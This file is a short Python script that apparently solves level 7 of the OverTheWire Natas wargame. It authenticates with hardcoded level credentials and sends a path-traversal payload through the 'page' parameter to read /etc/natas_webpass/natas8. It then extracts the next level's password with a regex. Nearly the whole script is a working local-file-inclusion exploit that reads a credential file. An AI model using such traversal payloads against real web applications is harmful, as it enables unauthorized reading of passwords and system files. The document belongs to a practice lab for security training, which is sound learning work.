import requests
import re

username = "natas7"
password = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"
url = "http://%s.natas.labs.overthewire.org/"  % username


lfi="index.php?page=../../../../../../../../../../../etc/natas_webpass/natas8"

session = requests.Session()

response = session.get(url,auth=(username,password))
pageContent = response.text
print(pageContent)
print("="*50)

response = session.get(url+lfi,auth=(username,password))
pageContent = response.text
print(pageContent)
print("="*50)

# Just Code Printing
exp = re.compile(r"[A-Za-z0-9]{32}")
code = re.findall(exp, pageContent)[1]
print("The code for the next level is: " + code)